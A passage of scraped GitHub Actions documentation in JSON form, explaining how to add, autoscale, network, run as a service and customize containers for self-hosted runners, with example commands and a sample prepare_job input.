      {
        "type": "paragraph",
        "text": "Organization owners can choose which repositories are allowed to create repository-level self-hosted runners."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeDisabling or limiting GitHub Actions for your organization."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickSettings. If you cannot see the \"Settings\" tab, select thedropdown menu, then clickSettings.",
          "In the left sidebar, clickActions, then clickRunners.",
          "ClickNew self-hosted runner.",
          "Select the operating system image and architecture of your self-hosted runner machine.",
          "You will see instructions showing you how to download the runner application and install it on your self-hosted runner machine.Open a shell on your self-hosted runner machine and run each shell command in the order shown.NoteOn Windows, if you want to install the self-hosted runner application as a service, you must open a shell with administrator privileges. We also recommend that you useC:\\actions-runneras the directory for the self-hosted runner application so that Windows system accounts can access the runner directory.The instructions walk you through completing these tasks:Downloading and extracting the self-hosted runner application.Running theconfigscript to configure the self-hosted runner application and register it with GitHub Actions. Theconfigscript requires the destination URL and an automatically-generated time-limited token to authenticate the request. The token expires after one hour.On Windows, theconfigscript also asks if you would like to install the self-hosted runner application as a service. For Linux and macOS, you can install a service after you finish adding the runner. For more information, seeConfiguring the self-hosted runner application as a service.Running the self-hosted runner application to connect the machine to GitHub Actions.",
          "Downloading and extracting the self-hosted runner application.",
          "Running theconfigscript to configure the self-hosted runner application and register it with GitHub Actions. Theconfigscript requires the destination URL and an automatically-generated time-limited token to authenticate the request. The token expires after one hour.On Windows, theconfigscript also asks if you would like to install the self-hosted runner application as a service. For Linux and macOS, you can install a service after you finish adding the runner. For more information, seeConfiguring the self-hosted runner application as a service.",
          "On Windows, theconfigscript also asks if you would like to install the self-hosted runner application as a service. For Linux and macOS, you can install a service after you finish adding the runner. For more information, seeConfiguring the self-hosted runner application as a service.",
          "Running the self-hosted runner application to connect the machine to GitHub Actions."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Checking that your self-hosted runner was successfully added"
      },
      {
        "type": "paragraph",
        "text": "After completing the steps to add a self-hosted runner, the runner and its status are now listed under \"Runners\"."
      },
      {
        "type": "paragraph",
        "text": "The self-hosted runner application must be active for the runner to accept jobs. When the runner application is connected to GitHub and ready to receive jobs, you will see the following message on the machine's terminal."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "√ Connected to GitHub\n\n2019-10-24 05:45:56Z: Listening for Jobs"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeMonitoring and troubleshooting self-hosted runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Adding a self-hosted runner to an organization"
      },
      {
        "type": "paragraph",
        "text": "You can add self-hosted runners at the organization level, where they can be used to process jobs for multiple repositories in an organization. To add a self-hosted runner to an organization, you must be an organization owner. For information about how to add a self-hosted runner with the REST API, seeREST API endpoints for self-hosted runners."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the organization.",
          "Under your organization name, clickSettings. If you cannot see the \"Settings\" tab, select thedropdown menu, then clickSettings.",
          "In the left sidebar, clickActions, then clickRunners.",
          "ClickNew runner, then clickNew self-hosted runner.",
          "Select the operating system image and architecture of your self-hosted runner machine.",
          "You will see instructions showing you how to download the runner application and install it on your self-hosted runner machine.Open a shell on your self-hosted runner machine and run each shell command in the order shown.NoteOn Windows, if you want to install the self-hosted runner application as a service, you must open a shell with administrator privileges. We also recommend that you useC:\\actions-runneras the directory for the self-hosted runner application so that Windows system accounts can access the runner directory.The instructions walk you through completing these tasks:Downloading and extracting the self-hosted runner application.Running theconfigscript to configure the self-hosted runner application and register it with GitHub Actions. Theconfigscript requires the destination URL and an automatically-generated time-limited token to authenticate the request. The token expires after one hour.On Windows, theconfigscript also asks if you would like to install the self-hosted runner application as a service. For Linux and macOS, you can install a service after you finish adding the runner. For more information, seeConfiguring the self-hosted runner application as a service.Running the self-hosted runner application to connect the machine to GitHub Actions.",
          "Downloading and extracting the self-hosted runner application.",
          "Running theconfigscript to configure the self-hosted runner application and register it with GitHub Actions. Theconfigscript requires the destination URL and an automatically-generated time-limited token to authenticate the request. The token expires after one hour.On Windows, theconfigscript also asks if you would like to install the self-hosted runner application as a service. For Linux and macOS, you can install a service after you finish adding the runner. For more information, seeConfiguring the self-hosted runner application as a service.",
          "On Windows, theconfigscript also asks if you would like to install the self-hosted runner application as a service. For Linux and macOS, you can install a service after you finish adding the runner. For more information, seeConfiguring the self-hosted runner application as a service.",
          "Running the self-hosted runner application to connect the machine to GitHub Actions."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Checking that your self-hosted runner was successfully added"
      },
      {
        "type": "paragraph",
        "text": "After completing the steps to add a self-hosted runner, the runner and its status are now listed under \"Runners\"."
      },
      {
        "type": "paragraph",
        "text": "The self-hosted runner application must be active for the runner to accept jobs. When the runner application is connected to GitHub and ready to receive jobs, you will see the following message on the machine's terminal."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "√ Connected to GitHub\n\n2019-10-24 05:45:56Z: Listening for Jobs"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeMonitoring and troubleshooting self-hosted runners."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "For security reasons, public repositories can't use runners in a runner group by default, but you can override this in the runner group's settings. For more information, seeManaging access to self-hosted runners using groups."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Adding a self-hosted runner to an enterprise"
      },
      {
        "type": "paragraph",
        "text": "If you use GitHub Enterprise Cloud, you can add self-hosted runners to an enterprise, where they can be assigned to multiple organizations. The organization owner can control which repositories can use it. For more information, see theGitHub Enterprise Cloud documentation."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/autoscaling-with-self-hosted-runners",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About autoscaling"
      },
      {
        "type": "paragraph",
        "text": "You can automatically increase or decrease the number of self-hosted runners in your environment in response to the webhook events you receive with a particular label. For example, you can create automation that adds a new self-hosted runner each time you receive aworkflow_jobwebhook event with thequeuedactivity, which notifies you that a new job is ready for processing. The webhook payload includes label data, so you can identify the type of runner the job is requesting. Once the job has finished, you can then create automation that removes the runner in response to theworkflow_jobcompletedactivity."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Supported autoscaling solutions"
      },
      {
        "type": "paragraph",
        "text": "GitHub-hosted runners inherently autoscale based on your needs. GitHub-hosted runners can be a low-maintenance and cost-effective alternative to developing or implementing autoscaling solutions. For more information, seeAbout GitHub-hosted runners."
      },
      {
        "type": "paragraph",
        "text": "Theactions/actions-runner-controller(ARC) project is a Kubernetes-based runner autoscaler. GitHub recommends ARC if the team deploying it has expert Kubernetes knowledge and experience."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeAbout Actions Runner ControllerandAbout support for Actions Runner Controller."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using ephemeral runners for autoscaling"
      },
      {
        "type": "paragraph",
        "text": "GitHub recommends implementing autoscaling with ephemeral self-hosted runners; autoscaling with persistent self-hosted runners is not recommended. In certain cases, GitHub cannot guarantee that jobs are not assigned to persistent runners while they are shut down. With ephemeral runners, this can be guaranteed because GitHub only assigns one job to a runner."
      },
      {
        "type": "paragraph",
        "text": "This approach allows you to manage your runners as ephemeral systems, since you can use automation to provide a clean environment for each job. This helps limit the exposure of any sensitive resources from previous jobs, and also helps mitigate the risk of a compromised runner receiving new jobs."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "The runner application log files for ephemeral runners must be forwarded to an external log storage solution for troubleshooting and diagnostic purposes. While it is not required for ephemeral runners to be deployed, GitHub recommends ensuring runner logs are forwarded and preserved externally before deploying an ephemeral runner autoscaling solution in a production environment. For more information, seeMonitoring and troubleshooting self-hosted runners."
      },
      {
        "type": "paragraph",
        "text": "To add an ephemeral runner to your environment, include the--ephemeralparameter when registering your runner usingconfig.sh. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "./config.sh --url https://github.com/octo-org --token example-token --ephemeral"
      },
      {
        "type": "paragraph",
        "text": "The GitHub Actions service will then automatically de-register the runner after it has processed one job. You can then create your own automation that wipes the runner after it has been de-registered."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If a job is labeled for a certain type of runner, but none matching that type are available, the job does not immediately fail at the time of queueing. Instead, the job will remain queued until the 24 hour timeout period expires."
      },
      {
        "type": "paragraph",
        "text": "Alternatively, you can create ephemeral, just-in-time runners using the REST API. For more information, seeREST API endpoints for self-hosted runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Controlling runner software updates on self-hosted runners"
      },
      {
        "type": "paragraph",
        "text": "By default, self-hosted runners will automatically perform a software update whenever a new version of the runner software is available. If you use ephemeral runners in containers then this can lead to repeated software updates when a new runner version is released. Turning off automatic updates allows you to update the runner version on the container image directly on your own schedule."
      },
      {
        "type": "paragraph",
        "text": "To turn off automatic software updates and install software updates yourself, specify the--disableupdateflag when registering your runner usingconfig.sh. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "./config.sh --url https://github.com/YOUR-ORGANIZATION --token EXAMPLE-TOKEN --disableupdate"
      },
      {
        "type": "paragraph",
        "text": "If you disable automatic updates, you must still update your runner version regularly. New functionality in GitHub Actions requires changes in both the GitHub Actions serviceandthe runner software. The runner may not be able to correctly process jobs that take advantage of new features in GitHub Actions without a software update."
      },
      {
        "type": "paragraph",
        "text": "If you disable automatic updates, you will be required to update your runner version within 30 days of a new version being made available. You may want to subscribe to notifications for releases in theactions/runnerrepository. For more information, seeConfiguring notifications."
      },
      {
        "type": "paragraph",
        "text": "For instructions on how to install the latest runner version, see the installation instructions forthe latest release."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "Any updates released for the software, including major, minor or patch releases, are considered as an available update. If you do not perform a software update within 30 days, the GitHub Actions service will not queue jobs to your runner. In addition, if a critical security update is required, the GitHub Actions service will not queue jobs to your runner until it has been updated."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using webhooks for autoscaling"
      },
      {
        "type": "paragraph",
        "text": "You can create your own autoscaling environment by using payloads received from theworkflow_jobwebhook. This webhook is available at the repository, organization, and enterprise levels, and the payload for this event contains anactionkey that corresponds to the stages of a workflow job's life-cycle; for example when jobs arequeued,in_progress, andcompleted. You must then create your own scaling automation in response to these webhook payloads."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "For more information about theworkflow_jobwebhook, seeWebhook events and payloads.",
          "To learn how to work with webhooks, seeWebhooks documentation."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Authentication requirements"
      },
      {
        "type": "paragraph",
        "text": "You can register and delete repository and organization self-hosted runners usingthe API. To authenticate to the API, your autoscaling implementation can use an access token or a GitHub app."
      },
      {
        "type": "paragraph",
        "text": "Your access token will require the following scope:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "For private repositories, use an access token with thereposcope.",
          "For public repositories, use an access token with thepublic_reposcope.",
          "For organizations, use an access token with theadmin:orgscope."
        ]
      },
      {
        "type": "paragraph",
        "text": "To authenticate using a GitHub App, it must be assigned the following permissions:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "For repositories, assign theadministrationpermission.",
          "For organizations, assign theorganization_self_hosted_runnerspermission."
        ]
      },
      {
        "type": "paragraph",
        "text": "You can register and delete enterprise self-hosted runners usingthe API. To authenticate to the API, your autoscaling implementation can use an access token."
      },
      {
        "type": "paragraph",
        "text": "Your access token will require themanage_runners:enterprisescope."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/communicating-with-self-hosted-runners",
    "content": [
      {
        "type": "paragraph",
        "text": "A self-hosted runner connects to GitHub to receive job assignments and to download new versions of the runner application. The self-hosted runner uses an HTTPS long poll that opens a connection to GitHub for 50 seconds, and if no response is received, it then times out and creates a new long poll. The application must be running on the machine to accept and run GitHub Actions jobs."
      },
      {
        "type": "paragraph",
        "text": "The GitHub Actions runner application is open source. You can contribute and file issues in therunnerrepository.  When a new version is released, the runner application automatically updates itself when a job is assigned to the runner, or within a week of release if the runner hasn't been assigned any jobs."
      },
      {
        "type": "paragraph",
        "text": "A self-hosted runner is automatically removed from GitHub if it has not connected to GitHub Actions for more than 14 days. An ephemeral self-hosted runner is automatically removed from GitHub if it has not connected to GitHub Actions for more than 1 day."
      },
      {
        "type": "paragraph",
        "text": "The connection between self-hosted runners and GitHub is over HTTPS (port 443)."
      },
      {
        "type": "paragraph",
        "text": "Since the self-hosted runner opens a connection to GitHub, you do not need to allow GitHub to make inbound connections to your self-hosted runner."
      },
      {
        "type": "paragraph",
        "text": "You must ensure that the machine has the appropriate network access with at least 70 kilobits per second upload and download speed to communicate with the GitHub hosts listed below. Some hosts are required for essential runner operations, while other hosts are only required for certain functionality."
      },
      {
        "type": "paragraph",
        "text": "You can use the REST API to get meta information about GitHub, including the IP addresses and domain details for GitHub services. Theactions_inboundsection of the API supports both fully qualified and wildcard domains. Fully qualified domains specify a complete domain name (e.g.,example.github.com), while wildcard domains use a*to represent multiple possible subdomains (e.g.,*.github.com). An example of the self-hosted runner requirements using wildcard domains has been listed below. For more information, seeREST API endpoints for meta data."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "github.com\n*.github.com\n*.githubusercontent.com\nghcr.io"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Some of the domains listed are configured usingCNAMErecords. Some firewalls might require you to add rules recursively for allCNAMErecords. Note that theCNAMErecords might change in the future, and that only the domains listed will remain constant."
      },
      {
        "type": "paragraph",
        "text": "Needed for essential operations:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "github.com\napi.github.com\n*.actions.githubusercontent.com"
      },
      {
        "type": "paragraph",
        "text": "Needed for downloading actions:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "codeload.github.com\npkg.actions.githubusercontent.com"
      },
      {
        "type": "paragraph",
        "text": "Needed for publishing immutable actions:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "ghcr.io"
      },
      {
        "type": "paragraph",
        "text": "Needed for uploading/downloading job summaries, logs, workflow artifacts, and caches:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "results-receiver.actions.githubusercontent.com\n*.blob.core.windows.net"
      },
      {
        "type": "paragraph",
        "text": "Needed for runner version updates:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "objects.githubusercontent.com\nobjects-origin.githubusercontent.com\ngithub-releases.githubusercontent.com\ngithub-registry-files.githubusercontent.com"
      },
      {
        "type": "paragraph",
        "text": "Needed for retrieving OIDC tokens:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "*.actions.githubusercontent.com"
      },
      {
        "type": "paragraph",
        "text": "Needed for downloading or publishing packages or containers to GitHub Packages:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "*.pkg.github.com\npkg-containers.githubusercontent.com\nghcr.io"
      },
      {
        "type": "paragraph",
        "text": "Needed for Git Large File Storage"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "github-cloud.githubusercontent.com\ngithub-cloud.s3.amazonaws.com"
      },
      {
        "type": "paragraph",
        "text": "Needed for jobs for Dependabot updates"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "dependabot-actions.githubapp.com"
      },
      {
        "type": "paragraph",
        "text": "In addition, your workflow may require access to other network resources."
      },
      {
        "type": "paragraph",
        "text": "If you use an IP address allow list for your GitHub organization or enterprise account, you must add your self-hosted runner's IP address to the allow list. SeeManaging allowed IP addresses for your organizationorEnforcing policies for security settings in your enterprisein the GitHub Enterprise Cloud documentation."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Further reading"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Using a proxy server with self-hosted runners",
          "Monitoring and troubleshooting self-hosted runners"
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/configuring-the-self-hosted-runner-application-as-a-service",
    "content": [
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "You must add a runner to GitHub before you can configure the self-hosted runner application as a service.\nFor more information, seeAdding self-hosted runners."
      },
      {
        "type": "paragraph",
        "text": "For Linux systems that usesystemd, you can use thesvc.shscript that is created after successfully adding the runner to install and manage using the application as a service."
      },
      {
        "type": "paragraph",
        "text": "On the runner machine, open a shell in the directory where you installed the self-hosted runner application. Use the commands below to install and manage the self-hosted runner service."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Configuring the self-hosted runner application as a service on Windows is part of the application configuration process. If you have already configured the self-hosted runner application but did not choose to configure it as a service, you must remove the runner from GitHub and re-configure the application. When you re-configure the application, choose the option to configure the application as a service."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeRemoving self-hosted runnersandAdding self-hosted runners."
      },
      {
        "type": "paragraph",
        "text": "You can manage the runner service in the WindowsServicesapplication, or you can use PowerShell to run the commands below."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "You must add a runner to GitHub before you can configure the self-hosted runner application as a service.\nFor more information, seeAdding self-hosted runners."
      },
      {
        "type": "paragraph",
        "text": "On the runner machine, open a shell in the directory where you installed the self-hosted runner application. Use the commands below to install and manage the self-hosted runner service."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Installing the service"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Stop the self-hosted runner application if it is currently running.",
          "Install the service with the following command:sudo ./svc.sh install",
          "Alternatively, the command takes an optionaluserargument to install the service as a different user../svc.sh install USERNAME"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Installing the service"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Stop the self-hosted runner application if it is currently running.",
          "Install the service with the following command:./svc.sh install"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Starting the service"
      },
      {
        "type": "paragraph",
        "text": "Start the service with the following command:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "sudo ./svc.sh start"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "Start-Service \"actions.runner.*\""
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "./svc.sh start"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Checking the status of the service"
      },
      {
        "type": "paragraph",
        "text": "Check the status of the service with the following command:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "sudo ./svc.sh status"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "Get-Service \"actions.runner.*\""
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "./svc.sh status"
      },
      {
        "type": "paragraph",
        "text": "For more information on viewing the status of your self-hosted runner, seeMonitoring and troubleshooting self-hosted runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Stopping the service"
      },
      {
        "type": "paragraph",
        "text": "Stop the service with the following command:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "sudo ./svc.sh stop"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "Stop-Service \"actions.runner.*\""
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "./svc.sh stop"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Uninstalling the service"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Stop the service if it is currently running.",
          "Uninstall the service with the following command:sudo ./svc.sh uninstallRemove-Service \"actions.runner.*\"./svc.sh uninstall"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Customizing the self-hosted runner service"
      },
      {
        "type": "paragraph",
        "text": "If you don't want to use the above defaultsystemdservice configuration, you can create a customized service or use whichever service mechanism you prefer. Consider using theservicedtemplate atactions-runner/bin/actions.runner.service.templateas a reference. If you use a customized service, the self-hosted runner service must always be invoked using therunsvc.shentry point."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Customizing the self-hosted runner service"
      },
      {
        "type": "paragraph",
        "text": "If you don't want to use the above default launchd service configuration, you can create a customized service or use whichever service mechanism you prefer. Consider using theplisttemplate atactions-runner/bin/actions.runner.plist.templateas a reference. If you use a customized service, the self-hosted runner service must always be invoked using therunsvc.shentry point."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/customizing-the-containers-used-by-jobs",
    "content": [
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "This feature is currently in public preview and is subject to change."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About container customization"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions allows you to run a job within a container, using thecontainer:statement in your workflow file. For more information, seeRunning jobs in a container. To process container-based jobs, the self-hosted runner creates a container for each job."
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions supports commands that let you customize the way your containers are created by the self-hosted runner. For example, you can use these commands to manage the containers through Kubernetes or Podman, and you can also customize thedocker runordocker createcommands used to invoke the container. The customization commands are run by a script, which is automatically triggered when a specific environment variable is set on the runner. For more information, seeTriggering the customization scriptbelow."
      },
      {
        "type": "paragraph",
        "text": "This customization is only available for Linux-based self-hosted runners, and root user access is not required."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Container customization commands"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions includes the following commands for container customization:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "prepare_job: Called when a job is started.",
          "cleanup_job: Called at the end of a job.",
          "run_container_step: Called once for each container action in the job.",
          "run_script_step: Runs any step that is not a container action."
        ]
      },
      {
        "type": "paragraph",
        "text": "Each of these customization commands must be defined in its own JSON file. The file name must match the command name, with the extension.json. For example, theprepare_jobcommand is defined inprepare_job.json. These JSON files will then be run together on the self-hosted runner, as part of the mainindex.jsscript. This process is described in more detail inGenerating the customization script."
      },
      {
        "type": "paragraph",
        "text": "These commands also include configuration arguments, explained below in more detail."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "prepare_job"
      },
      {
        "type": "paragraph",
        "text": "Theprepare_jobcommand is called when a job is started. GitHub Actions passes in any job or service containers the job has. This command will be called if you have any service or job containers in the job."
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions assumes that you will do the following tasks in theprepare_jobcommand:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Prune anything from previous jobs, if needed.",
          "Create a network, if needed.",
          "Pull the job and service containers.",
          "Start the job container.",
          "Start the service containers.",
          "Write to the response file any information that GitHub Actions will need:Required: State whether the container is analpinelinux container (using theisAlpineboolean).Optional: Any context fields you want to set on the job context, otherwise they will be unavailable for users to use. For more information, seeAccessing contextual information about workflow runs.",
          "Required: State whether the container is analpinelinux container (using theisAlpineboolean).",
          "Optional: Any context fields you want to set on the job context, otherwise they will be unavailable for users to use. For more information, seeAccessing contextual information about workflow runs.",
          "Return0when the health checks have succeeded and the job/service containers are started."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Arguments forprepare_job"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "jobContainer:Optional. An object containing information about the specified job container.image:Required. A string containing the Docker image.workingDirectory:Required. A string containing the absolute path of the working directory.createOptions:Optional. The optionalcreateoptions specified in the YAML. For more information, seeRunning jobs in a container.environmentVariables:Optional. Sets a map of key environment variables.userMountVolumes:Optional. An array of user mount volumes set in the YAML. For more information, seeRunning jobs in a container.sourceVolumePath:Required. The source path to the volume that will be mounted into the Docker container.targetVolumePath:Required. The target path to the volume that will be mounted into the Docker container.readOnly:Required. Determines whether or not the mount should be read-only.systemMountVolumes:Required. An array of mounts to mount into the container, same fields as above.sourceVolumePath:Required. The source path to the volume that will be mounted into the Docker container.targetVolumePath:Required. The target path to the volume that will be mounted into the Docker container.readOnly:Required. Determines whether or not the mount should be read-only.registryOptional. The Docker registry credentials for a private container registry.username:Optional. The username of the registry account.password:Optional. The password to the registry account.serverUrl:Optional. The registry URL.portMappings:Optional. A key value hash ofsource:targetports to map into the container.",
          "image:Required. A string containing the Docker image.",
          "workingDirectory:Required. A string containing the absolute path of the working directory.",
          "createOptions:Optional. The optionalcreateoptions specified in the YAML. For more information, seeRunning jobs in a container.",
          "environmentVariables:Optional. Sets a map of key environment variables.",
          "userMountVolumes:Optional. An array of user mount volumes set in the YAML. For more information, seeRunning jobs in a container.sourceVolumePath:Required. The source path to the volume that will be mounted into the Docker container.targetVolumePath:Required. The target path to the volume that will be mounted into the Docker container.readOnly:Required. Determines whether or not the mount should be read-only.",
          "sourceVolumePath:Required. The source path to the volume that will be mounted into the Docker container.",
          "targetVolumePath:Required. The target path to the volume that will be mounted into the Docker container.",
          "readOnly:Required. Determines whether or not the mount should be read-only.",
          "systemMountVolumes:Required. An array of mounts to mount into the container, same fields as above.sourceVolumePath:Required. The source path to the volume that will be mounted into the Docker container.targetVolumePath:Required. The target path to the volume that will be mounted into the Docker container.readOnly:Required. Determines whether or not the mount should be read-only.",
          "sourceVolumePath:Required. The source path to the volume that will be mounted into the Docker container.",
          "targetVolumePath:Required. The target path to the volume that will be mounted into the Docker container.",
          "readOnly:Required. Determines whether or not the mount should be read-only.",
          "registryOptional. The Docker registry credentials for a private container registry.username:Optional. The username of the registry account.password:Optional. The password to the registry account.serverUrl:Optional. The registry URL.",
          "username:Optional. The username of the registry account.",
          "password:Optional. The password to the registry account.",
          "serverUrl:Optional. The registry URL.",
          "portMappings:Optional. A key value hash ofsource:targetports to map into the container.",
          "services:Optional. An array of service containers to spin up.contextName:Required. The name of the service in the Job context.image:Required. A string containing the Docker image.createOptions:Optional. The optionalcreateoptions specified in the YAML. For more information, seeRunning jobs in a container.environmentVariables:Optional. Sets a map of key environment variables.userMountVolumes:Optional. An array of mounts to mount into the container, same fields as above.sourceVolumePath:Required. The source path to the volume that will be mounted into the Docker container.targetVolumePath:Required. The target path to the volume that will be mounted into the Docker container.readOnly:Required. Determines whether or not the mount should be read-only.registryOptional. The Docker registry credentials for the private container registry.username:Optional. The username of the registry account.password:Optional. The password to the registry account.serverUrl:Optional. The registry URL.portMappings:Optional. A key value hash ofsource:targetports to map into the container.",
          "contextName:Required. The name of the service in the Job context.",
          "image:Required. A string containing the Docker image.",
          "createOptions:Optional. The optionalcreateoptions specified in the YAML. For more information, seeRunning jobs in a container.",
          "environmentVariables:Optional. Sets a map of key environment variables.",
          "userMountVolumes:Optional. An array of mounts to mount into the container, same fields as above.sourceVolumePath:Required. The source path to the volume that will be mounted into the Docker container.targetVolumePath:Required. The target path to the volume that will be mounted into the Docker container.readOnly:Required. Determines whether or not the mount should be read-only.",
          "sourceVolumePath:Required. The source path to the volume that will be mounted into the Docker container.",
          "targetVolumePath:Required. The target path to the volume that will be mounted into the Docker container.",
          "readOnly:Required. Determines whether or not the mount should be read-only.",
          "registryOptional. The Docker registry credentials for the private container registry.username:Optional. The username of the registry account.password:Optional. The password to the registry account.serverUrl:Optional. The registry URL.",
          "username:Optional. The username of the registry account.",
          "password:Optional. The password to the registry account.",
          "serverUrl:Optional. The registry URL.",
          "portMappings:Optional. A key value hash ofsource:targetports to map into the container."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example input forprepare_job"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n  \"command\": \"prepare_job\",\n  \"responseFile\": \"/users/octocat/runner/_work/{guid}.json\",\n  \"state\": {},\n  \"args\": {\n    \"jobContainer\": {\n      \"image\": \"node:18\"\n      \"workingDirectory\": \"/__w/octocat-test2/octocat-test2\",\n      \"createOptions\": \"--cpus 1\",\n      \"environmentVariables\": {\n        \"NODE_ENV\": \"development\"\n      },\n      \"userMountVolumes\": [\n        {\n          \"sourceVolumePath\": \"my_docker_volume\",\n          \"targetVolumePath\": \"/volume_mount\",\n          \"readOnly\": false\n        }\n      ],\n      \"systemMountVolumes\": [\n        {\n          \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work\",\n          \"targetVolumePath\": \"/__w\",\n          \"readOnly\": false\n        },\n        {\n          \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/externals\",\n          \"targetVolumePath\": \"/__e\",\n          \"readOnly\": true\n        },\n        {\n          \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_temp\",\n          \"targetVolumePath\": \"/__w/_temp\",\n          \"readOnly\": false\n        },\n        {\n          \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_actions\",\n          \"targetVolumePath\": \"/__w/_actions\",\n          \"readOnly\": false\n        },\n        {\n          \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_tool\",\n          \"targetVolumePath\": \"/__w/_tool\",\n          \"readOnly\": false\n        },\n        {\n          \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_temp/_github_home\",\n          \"targetVolumePath\": \"/github/home\",\n          \"readOnly\": false\n        },\n        {\n          \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_temp/_github_workflow\",\n          \"targetVolumePath\": \"/github/workflow\",\n          \"readOnly\": false\n        }\n      ],\n      \"registry\": {\n        \"username\": \"octocat\",\n        \"password\": \"examplePassword\",\n        \"serverUrl\": \"https://index.docker.io/v1\"\n      },\n      \"portMappings\": { \"80\": \"801\" }\n    },\n    \"services\": [\n      {\n        \"contextName\": \"redis\",\n        \"image\": \"redis\",\n        \"createOptions\": \"--cpus 1\",\n        \"environmentVariables\": {},\n        \"userMountVolumes\": [],\n        \"portMappings\": { \"80\": \"801\" },\n        \"registry\": {\n          \"username\": \"octocat\",\n          \"password\": \"examplePassword\",\n          \"serverUrl\": \"https://index.docker.io/v1\"\n        }\n      }\n    ]\n  }\n}"
      },
      {
        "type": "heading",
        "level": 4,
